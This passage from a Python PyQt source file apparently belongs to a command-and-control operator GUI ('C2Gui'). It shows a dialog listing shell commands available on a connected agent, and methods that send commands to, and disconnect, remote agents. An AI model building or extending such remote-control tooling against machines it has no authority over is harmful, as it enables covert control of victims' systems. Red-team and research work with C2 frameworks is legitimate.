            # Basic shell with limited info
            details += f"""
⚠️ BASIC SHELL CONNECTION:
   ├─ Type: Basic Command Shell
   ├─ Capabilities: Limited command execution
   ├─ Raw Response: {str(system_info)[:200]}...
   └─ Recommendation: Consider upgrading to advanced agent for full functionality

🔧 AVAILABLE COMMANDS:
   ├─ Basic system commands (dir, whoami, hostname, etc.)
   ├─ Network commands (ipconfig, netstat, ping, etc.)
   ├─ Process commands (tasklist, taskkill, etc.)
   └─ File operations (type, copy, move, del, etc.)

╚══════════════════════════════════════════════════════════════════════════════════════╝
"""
        
        details_text.setPlainText(details)
        layout.addWidget(details_text)
        
        # Close button
        close_btn = QPushButton("✅ Close")
        close_btn.clicked.connect(dialog.accept)
        layout.addWidget(close_btn)
        
        dialog.exec()

    def send_agent_command(self, agent_id, command):
        """Send a command to a specific agent"""
        if hasattr(self, 'agent_selector') and hasattr(self, 'command_input'):
            # Set the agent selector to the specified agent
            for i in range(self.agent_selector.count()):
                if self.agent_selector.itemText(i).startswith(f"Agent {agent_id}"):
                    self.agent_selector.setCurrentIndex(i)
                    break
            
            # Set the command and send it
            self.command_input.setText(command)
            self.send_command()

    def disconnect_agent(self, agent_id):
        """Disconnect a specific agent"""
        if not self.server_thread or agent_id not in self.server_thread.server.clients:
            return
            
        reply = QMessageBox.question(self, "Disconnect Agent", 
                                   f"Are you sure you want to disconnect Agent {agent_id}?",
                                   QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        
        if reply == QMessageBox.StandardButton.Yes:
            try:
                # Close the agent connection
                self.server_thread.server.cleanup_client(agent_id)
                self.log_message(f"Agent {agent_id} disconnected by user")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Failed to disconnect agent: {e}")

    def closeEvent(self, event):
        """Proper cleanup when application closes"""
        if hasattr(self, 'server_thread') and self.server_thread and self.server_thread.isRunning():
            self.server_thread.stop()
        if hasattr(self, 'server_thread') and self.server_thread:
            self.server_thread.deleteLater()
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = C2Gui()
    window.show()
    sys.exit(app.exec())